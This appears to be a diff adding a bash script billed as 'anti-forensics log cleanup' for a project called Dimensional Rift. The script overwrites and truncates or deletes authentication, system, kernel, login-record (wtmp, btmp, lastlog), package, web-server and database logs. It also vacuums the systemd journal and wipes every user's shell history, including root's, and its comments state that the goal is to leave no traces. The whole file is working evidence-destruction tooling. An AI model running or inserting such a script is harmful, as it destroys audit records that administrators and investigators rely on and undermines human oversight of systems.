@@ -1,0 +1,97 @@
+#!/bin/bash
+
+# Anti-forensics log cleanup for Dimensional Rift
+# No logging to avoid traces
+
+# Function to securely wipe log files
+secure_wipe_log() {
+    local log_file="$1"
+    if [ -f "$log_file" ]; then
+        # Overwrite with zeros then random data, then truncate
+        dd if=/dev/zero of="$log_file" bs=1M count=1 2>/dev/null
+        dd if=/dev/urandom of="$log_file" bs=1M count=1 2>/dev/null
+        cat /dev/null > "$log_file" 2>/dev/null
+        # Set proper permissions
+        chmod 644 "$log_file" 2>/dev/null
+    fi
+}
+
+# Function to clean rotated logs
+clean_rotated_logs() {
+    local base_log="$1"
+    # Clean numbered rotated logs (.1, .2, etc.)
+    for i in {1..9}; do
+        [ -f "${base_log}.${i}" ] && rm -f "${base_log}.${i}" 2>/dev/null
+        [ -f "${base_log}.${i}.gz" ] && rm -f "${base_log}.${i}.gz" 2>/dev/null
+    done
+}
+
+# System logs
+secure_wipe_log "/var/log/auth.log"
+clean_rotated_logs "/var/log/auth.log"
+
+secure_wipe_log "/var/log/syslog"
+clean_rotated_logs "/var/log/syslog"
+
+secure_wipe_log "/var/log/kern.log"
+clean_rotated_logs "/var/log/kern.log"
+
+secure_wipe_log "/var/log/daemon.log"
+clean_rotated_logs "/var/log/daemon.log"
+
+secure_wipe_log "/var/log/messages"
+clean_rotated_logs "/var/log/messages"
+
+secure_wipe_log "/var/log/debug"
+clean_rotated_logs "/var/log/debug"
+
+# Application logs
+secure_wipe_log "/var/log/apt/history.log"
+secure_wipe_log "/var/log/apt/term.log"
+secure_wipe_log "/var/log/dpkg.log"
+clean_rotated_logs "/var/log/dpkg.log"
+secure_wipe_log "/var/log/alternatives.log"
+
+# Boot and system logs
+secure_wipe_log "/var/log/boot.log"
+secure_wipe_log "/var/log/dmesg"
+secure_wipe_log "/var/log/faillog"
+secure_wipe_log "/var/log/lastlog"
+
+# Network logs
+secure_wipe_log "/var/log/mail.log"
+clean_rotated_logs "/var/log/mail.log"
+
+# User activity logs
+secure_wipe_log "/var/log/wtmp"
+secure_wipe_log "/var/log/btmp"
+secure_wipe_log "/var/log/utmp"
+
+# Clean journal logs (systemd)
+if command -v journalctl >/dev/null 2>&1; then
+    journalctl --vacuum-time=1s 2>/dev/null
+    journalctl --vacuum-size=1K 2>/dev/null
+fi
+
+# Clean user bash histories
+for user_home in /home/* /root; do
+    if [ -d "$user_home" ]; then
+        for hist_file in "$user_home/.bash_history" "$user_home/.zsh_history" "$user_home/.history"; do
+            [ -f "$hist_file" ] && secure_wipe_log "$hist_file"
+        done
+        # Clean recently accessed files
+        [ -f "$user_home/.local/share/recently-used.xbel" ] && secure_wipe_log "$user_home/.local/share/recently-used.xbel"
+    fi
+done
+
+# Clean application-specific logs
+for log_dir in /var/log/apache2 /var/log/nginx /var/log/mysql /var/log/postgresql; do
+    if [ -d "$log_dir" ]; then
+        find "$log_dir" -type f -name "*.log*" -exec rm -f {} \; 2>/dev/null
+    fi
+done
+
+# Clean any remaining log files
+find /var/log -name "*.log" -type f -exec sh -c 'dd if=/dev/zero of="$1" bs=1K count=1 2>/dev/null; cat /dev/null > "$1"' _ {} \; 2>/dev/null
+
+exit 0
